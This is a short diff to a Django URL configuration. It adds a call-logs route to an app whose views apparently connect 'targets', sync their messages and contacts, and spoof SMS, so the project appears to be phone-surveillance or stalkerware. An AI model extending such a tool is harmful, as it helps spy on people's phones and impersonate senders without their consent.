@@ -1,6 +1,6 @@
 from django.urls import path
 from .views import (SigninView, SignUpView,
-                    VerifyEmailView, ProfileView, TargetsView, MessagesView, SyncTargetView, SpoofSMSView, ContactsView)
+                    VerifyEmailView, ProfileView, TargetsView, MessagesView, SyncTargetView, SpoofSMSView, ContactsView, CallLogsView)
 from .apis import ConnectTargetView, SyncCallbackView
 
 urlpatterns = [
@@ -19,4 +19,5 @@ urlpatterns = [
          SyncCallbackView.as_view(), name="sync-callback"),
     path("spoof-sms/", SpoofSMSView.as_view(), name="spoof-sms"),
     path("contacts/", ContactsView.as_view(), name="contacts"),
+    path("call-logs/", CallLogsView.as_view(), name="call-logs"),
 ]
